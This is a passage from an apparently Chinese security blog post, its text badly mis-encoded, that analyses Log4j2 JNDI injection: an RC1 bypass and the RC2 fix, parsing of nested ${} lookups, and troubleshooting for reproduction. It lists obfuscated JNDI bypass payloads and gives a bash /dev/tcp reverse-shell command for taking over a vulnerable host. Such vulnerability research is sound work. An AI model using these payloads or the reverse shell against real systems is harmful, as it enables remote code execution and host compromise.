<li>å› æ­¤ï¼Œåªè¦åœ¨åˆ¤æ–­æ—¶è§¦å‘ <code>URISyntaxException</code> å¼‚å¸¸ï¼Œä¾‹å¦‚åœ¨ URI ä¸­æ’å…¥ç©ºæ ¼ï¼Œå³å¯è§¦å‘æ¼æ´,payloadå¦‚ä¸‹:<code>${jndi:ldap://127.0Ã¥.0.1:1389/ badClassName}</code>ä¸å¯¹ç©ºæ ¼åšç¼–ç å¯¼è‡´å¼‚å¸¸ï¼Œä½†æ˜¯<code>lookup</code>æ—¶å€™ä¼šå»æ‰è¿™ä¸ªç©ºæ ¼ï¼‰</li>
</ul>
<h3 id="rc2ä¿®å¤">RC2ä¿®å¤<a hidden class="anchor" aria-hidden="true" href="#rc2ä¿®å¤">#</a></h3>
<p>RC2çš„ä¿®å¤æ–¹æ¡ˆæ˜¯ç›´æ¥returnï¼Œæœ‰æ•ˆè§£å†³äº†ä¸Šæ–‡çš„ç»•è¿‡</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>try{
</span></span><span style="display:flex;"><span>} catch (URISyntaxException ex) {
</span></span><span style="display:flex;"><span>    LOGGER.warn(&#34;Invalid JNDI URI - {}&#34;, name);
</span></span><span style="display:flex;"><span>    return null;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>return (T) this.context.lookup(name);
</span></span></code></pre></div><h3 id="å¤šä¸ªæ‰§è¡Œæµç¨‹">å¤šä¸ª${}æ‰§è¡Œæµç¨‹<a hidden class="anchor" aria-hidden="true" href="#å¤šä¸ªæ‰§è¡Œæµç¨‹">#</a></h3>
<p>Ã¥</p>
<p>å…ˆæ¥åˆ†æä¸€ä¸‹å¤šä¸ª${}çš„æ‰§è¡Œæµç¨‹ï¼ŒPayloadä¸¾ä¾‹å¦‚ä¸‹ï¼š</p>
<p><code>${aaa:${bbb:ccc}dd}${ee:ff}</code></p>
<p>å½“è¯†åˆ«åˆ°å¤šä¸ª${}æ—¶ï¼Œå‡†å¤‡æ¥è¯´æ˜¯è¯†åˆ«åˆ°å¤šä¸ª${æ—¶ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li>
<p>å½“å±äºåµŒå¥—ç±»å‹æ—¶ï¼Œæ¯”å¦‚<code>${${}}</code>ï¼Œå‚æ•°<code>nestedVarCount</code>ä¼šæ‰§è¡Œ+1æ“ä½œï¼Œè¡¨ç¤ºå­˜åœ¨åµŒå¥—ï¼Œé˜²æ­¢æ‰¾é”™é—­åˆæ—¶ç”¨çš„}ï¼Œä¼šå…ˆå¤„ç†å†…éƒ¨çš„<code>${}</code>ï¼Œå†å°†å¤„ç†ç»“æœè¿”å›åç»§ç»­å¤„ç†<code>${}</code> <code>ï¼›å…·ä½“çš„åŸå› ï¼Œå°±æ˜¯å› ä¸ºä¼šé€’å½’è°ƒç”¨</code>substitute()`ï¼Œæ‰€ä»¥ä¼šå…ˆæŠŠå†…éƒ¨çš„å¤„ç†å®Œã€‚</p>
</li>
<li>
<p>å½“å±äºå¹¶åˆ—ç±»å‹æ—¶ï¼Œæ¯”å¦‚${}${}ï¼Œä¼šä¾æ¬¡å¤„ç†${}ï¼›å› ä¸ºä»–ä¸€æ¬¡åªä¼šæå–ä¸€æ•´ä¸ª<code>${}</code>ã€‚</p>
</li>
</ul>
<h3 id="åˆ†éš”ç¬¦">åˆ†éš”ç¬¦<a hidden class="anchor" aria-hidden="true" href="#åˆ†éš”ç¬¦">#</a></h3>
<p><code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()</code>é‡Œå¤„ç†å®Œ<code>${}</code>åï¼Œå°±ä¼šæœ‰ä¸€éƒ¨åˆ†çš„åˆ†éš”ç¬¦å¤„ç†ï¼Œä¸€ä¸ªæ˜¯<code>valueEscapeDelimiterMatcher [:\-]</code>ï¼Œå¦ä¸€ä¸ªæ˜¯<code>valueDelimiterMatcher [:-]</code></p>
<p>å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ª<code>valueEscapeDelimiterMatcher</code>ï¼Œpayload:<code> ${aa:\\-bb}</code></p>
<p>ä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œå°±æ˜¯ç»™ :- ä¸­çš„ \ å»æ‰äº†å˜æˆäº†:-ï¼Œ</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919233852327.png" alt="image-20220919233852327"  />
</p>
<p>å†æ¥çœ‹çœ‹valueDelimiterMatcherï¼Œpayload <code>${aa:-bb}</code></p>
<p>ä»ä¸‹é¢å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¢«:-åˆ†å‰²æˆäº†å‰åä¸¤éƒ¨åˆ†ï¼Œå‰é¢çš„éƒ¨åˆ†èµ‹å€¼ç»™varNameï¼Œåé¢éƒ¨åˆ†èµ‹å€¼ç»™varDefaultValueï¼›</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919234014159.png" alt="image-20220919234014159"  />
</p>
<ul>
<li>varNameä¼šè¢«ä¼ å…¥åˆ°resolveVariable()è¿›è¡Œè§£æï¼Œå¦‚æœæ²¡æœ‰åè®®ä»€ä¹ˆçš„ï¼Œå°±ä¼šè¿”å›null</li>
<li>å¦‚æœresolveVariable()è¿”å›å€¼ä¸ºnullï¼ŒvarDefaultValueåœ¨åç»­çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šé€’å½’è°ƒç”¨substitute</li>
</ul>
<p>æœ€åä¼šè¿”å›varDefaultValueçš„å€¼</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919234541090.png" alt="image-20220919234541090"  />
</p>
<ul>
<li>
<p>ä¸€äº›ç»•è¿‡<code>payload</code></p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ä¸€äº›ç»•è¿‡paylioad
</span></span><span style="display:flex;"><span>${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span></code></pre></div><ul>
<li>æ„Ÿè§‰ä¸»è¦æ˜¯å¯¹<code>jdni</code>å­—æ®µè¿›è¡Œå¤„ç†çš„ç»•è¿‡ã€‚</li>
</ul>
</li>
</ul>
<h2 id="0x07-é”™è¯¯è§£å†³">0x07 é”™è¯¯è§£å†³<a hidden class="anchor" aria-hidden="true" href="#0x07-é”™è¯¯è§£å†³">#</a></h2>
<h3 id="reference-class-name-foo">Reference Class Name: foo<a hidden class="anchor" aria-hidden="true" href="#reference-class-name-foo">#</a></h3>
<h4 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€<a hidden class="anchor" aria-hidden="true" href="#æ–¹æ³•ä¸€">#</a></h4>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918170850226.png" alt="image-20220918170850226"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> å› ä¸ºåœ¨2018å¹´10æœˆï¼ŒJavaæœ€ç»ˆä¹Ÿä¿®å¤äº†è¿™ä¸ªåˆ©ç”¨ç‚¹ï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶11.0.1ã€8u191ã€7u201ã€6u211 com.sun.jndi.ldap.object.trustURLCodebase é»˜è®¤ä¸ºfalse
</span></span></code></pre></div><p>æˆ‘ä»¬è¿™é‡Œjavaç‰ˆæœ¬ä¸º:<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918171016840.png" alt="image-20220918171016840"  />
</p>
<p>ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œæ‰€ä»¥å¯¼è‡´æŠ¥é”™ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œéœ€è¦åŠ ä¸Šä¸€ä¸‹ä»£ç ï¼š<code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>å³å¯å¤ç°æˆåŠŸ</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918171148116.png" alt="image-20220918171148116"  />
</p>
<h4 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒï¼š<a hidden class="anchor" aria-hidden="true" href="#æ–¹æ³•äºŒ">#</a></h4>
<p>å®é™…ä¸Šé™åˆ¶äº†<code>trustURLCodebase</code>ä¸º<code>Flase</code>å¹¶ä¸å½±å“å…¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹<code>shell</code>æ‹¿åˆ°å¼€å¯log4j2æœåŠ¡ä¸»æœºçš„æƒé™ã€‚åªéœ€è¦æŒ‡å®šå‘½ä»¤:<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>å³å¯ã€‚</p>
<h2 id="0x08-å‚è€ƒèµ„æ–™">0x08 å‚è€ƒèµ„æ–™<a hidden class="anchor" aria-hidden="true" href="#0x08-å‚è€ƒèµ„æ–™">#</a></h2>
<p><a href="https://cloud.tencent.com/developer/article/1987389">https://cloud.tencent.com/developer/article/1987389</a></p>
<p><a href="https://www.cnblogs.com/hhhhhxian/p/16214263.html">https://www.cnblogs.com/hhhhhxian/p/16214263.html</a></p>
<p><a href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p>
<p><a href="https://www.websecuritys.cn/index.php/archives/576/">https://www.websecuritys.cn/index.php/archives/576/</a></p>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
<p><a href="https://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q">https://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://www.reus09.top/tags/log4j2/">log4j2</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://www.reus09.top/posts/tech/dockerfile%E7%BC%96%E5%86%99/">
    <span class="title">Â« Prev</span>
    <br>
    <span>Dockerfileç¼–å†™</span>
  </a>
  <a class="next" href="http://www.reus09.top/posts/tech/xss/">
    <span class="title">Next Â»</span>
    <br>
    <span>Xss</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
